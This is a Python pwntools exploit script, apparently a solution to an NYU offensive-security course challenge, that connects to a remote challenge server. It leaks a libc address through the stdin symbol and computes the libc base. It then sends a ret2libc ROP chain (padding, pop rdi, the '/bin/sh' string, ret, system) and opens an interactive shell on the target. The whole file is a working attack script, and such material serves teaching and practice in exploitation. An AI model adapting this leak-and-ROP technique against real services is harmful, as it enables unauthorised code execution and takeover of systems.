from pwn import *

libc = ELF("./libc.so.6", checksec=False)
target_binary = ELF("./ez_target", checksec=False)
connection = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1203)
connection.sendlineafter(b'abc123): ', b'<NET ID>')  # Send NetID

# Send address to trigger leak and parse the libc base address
connection.sendafter(b'ask me?\n', p64(target_binary.symbols.stdin))
leaked_address = int(connection.recvline().strip(), 16)
libc_base = leaked_address - libc.symbols['_IO_2_1_stdin_']

# Calculate gadgets and function addresses using libc base
pop_rdi_gadget = ROP(libc).rdi.address + libc_base
bin_sh_string = next(libc.search(b"/bin/sh")) + libc_base
ret_gadget = ROP(libc).ret.address + libc_base
system_function = libc.symbols.system + libc_base

# Build the ROP chain with padding and gadgets
buffer_padding = b'A' * 0x10 + p64(0xdeadbeef)
rop_chain = buffer_padding + p64(pop_rdi_gadget) + p64(bin_sh_string) + p64(ret_gadget) + p64(system_function)

connection.sendlineafter(b'shell!\n', rop_chain)
connection.interactive()
